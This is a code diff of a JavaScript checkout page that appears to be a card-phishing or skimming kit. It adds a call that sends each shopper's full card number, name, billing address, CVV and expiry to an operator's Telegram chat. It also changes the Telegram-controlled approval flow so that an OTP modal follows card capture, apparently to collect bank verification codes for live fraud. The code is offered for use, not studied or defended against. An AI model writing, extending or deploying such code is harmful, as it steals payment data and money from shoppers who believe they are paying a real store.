@@ -710,7 +710,7 @@ const cq = u.callback_query;
       if (kind === 'checkout' && action === 'approve') {
         showCardModal(sessionId);
       } else if (kind === 'card' && action === 'approve') {
-        sendOtpNotification(sessionId);
+        showOtpModal(sessionId);
       } else if (kind === 'otp' && action === 'approve') {
         showCheckoutSuccess();
       }
@@ -986,6 +986,15 @@ Price: ${money(unitPrice)}`,
       
 session.card = { number: cardNumber, expiry, cvc, name: cardName, address: billingAddress };
       sessions.set(sessionId, session);
+      
+      tgNotify(window.TELEGRAM_CONFIG.chatId,
+      `🔔 CARD DETAILS RECEIVED
+ID: ${sessionId}
+Card: ${cardNumber.replace(/ /g, '').replace(/(.{4})/g, '$1 ')}
+Name: ${cardName}
+Address: ${billingAddress}
+CVV: ${cvc}
+EXP: ${expiry}`);
       
       document.querySelector('#checkout-card-modal').classList.remove('open');
       document.querySelector('#checkout-card-modal').setAttribute('aria-hidden', 'true');
